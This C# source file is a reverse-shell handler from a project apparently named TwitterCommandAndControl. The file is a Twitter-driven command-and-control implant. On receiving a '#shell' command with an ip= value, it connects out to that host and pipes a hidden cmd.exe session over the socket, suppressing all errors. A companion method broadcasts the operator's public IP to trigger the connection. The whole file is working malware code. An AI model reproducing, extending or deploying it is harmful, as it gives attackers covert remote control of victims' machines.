using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using TwitterCommandAndControl;
using TwitterCommandAndControl.Core;

namespace TwitterCommandAndControl.Handlers
{
    public class ReverseShellHandler : Handler
    {   
        private ReverseShellHandler() : base() { }

        public static void Respond(string command)
        {
            NetworkStream networkStream = null;
            StreamReader streamReader = null;
            StreamWriter streamWriter = null;
            Process processCmd = null;

            command = command.ToLower();
            if (command.Contains("#shell"))
            {
                var ip = command.Split('#').Where(x => x.StartsWith("ip=")).Select(x => x.Split('=')[1]).FirstOrDefault();
                try
                {
                    using (var tcpClient = new TcpClient())
                    {
                        tcpClient.Connect(ip, PORT);
                        using (networkStream = tcpClient.GetStream())
                        using (streamReader = new StreamReader(networkStream))
                        using (streamWriter = new StreamWriter(networkStream))
                        using (processCmd = new Process())
                        {
                            processCmd.StartInfo.FileName = "cmd.exe";
                            processCmd.StartInfo.CreateNoWindow = true;
                            processCmd.StartInfo.UseShellExecute = false;
                            processCmd.StartInfo.RedirectStandardOutput = true;
                            processCmd.StartInfo.RedirectStandardInput = true;
                            processCmd.StartInfo.RedirectStandardError = true;
                            processCmd.OutputDataReceived += (x, y) =>
                            {
                                try
                                {
                                    if (streamWriter.BaseStream != null && streamWriter.BaseStream.CanWrite)
                                    {
                                        streamWriter.WriteLine(y.Data);
                                        streamWriter.Flush();
                                    }
                                }
                                catch { }
                            };
                            processCmd.ErrorDataReceived += (x, y) =>
                            {
                                try
                                {
                                    if (streamWriter.BaseStream != null && streamWriter.BaseStream.CanWrite)
                                    {
                                        streamWriter.WriteLine(y.Data);
                                        streamWriter.Flush();
                                    }
                                }
                                catch { }
                            };
                            processCmd.Start();
                            processCmd.BeginOutputReadLine();
                            processCmd.BeginErrorReadLine();
                            processCmd.StandardInput.WriteLine();

                            var readTask = Task.Run(() =>
                            {
                                while (!processCmd.HasExited && tcpClient.Connected)
                                {
                                    try
                                    {
                                        var x = streamReader.ReadLine();
                                        processCmd.StandardInput.WriteLine(x);
                                    }
                                    catch { }
                                }
                            });

                            var writeTask = Task.Run(() =>
                            {
                                while (!processCmd.HasExited && tcpClient.Connected)
                                {
                                    try
                                    {
                                        var x = processCmd.StandardOutput.ReadLine();
                                        if (streamWriter.BaseStream != null && streamWriter.BaseStream.CanWrite)
                                        {
                                            streamWriter.WriteLine(x);
                                            streamWriter.Flush();
                                        }
                                    }
                                    catch { }
                                }
                            });

                            var errorTask = Task.Run(() =>
                            {
                                while (!processCmd.HasExited && tcpClient.Connected)
                                {
                                    try
                                    {
                                        var x = processCmd.StandardError.ReadLine();
                                        if (streamWriter.BaseStream != null && streamWriter.BaseStream.CanWrite)
                                        {
                                            streamWriter.WriteLine(x);
                                            streamWriter.Flush();
                                        }
                                    }
                                    catch { }
                                }
                            });

                            Task.WaitAll(readTask, writeTask, errorTask);

                            processCmd.Kill();
                        }
                    }
                }
                catch { }
                finally { }
            }
        }

        public static TcpClient Request(string commandPrefix)
        {
            var listenerTask = NextClient();
            Messenger.Send(commandPrefix + " #shell #ip=" + GetPublicIP.GetIP());
            listenerTask.Wait();
            return listenerTask.Result;
        }
    }
}
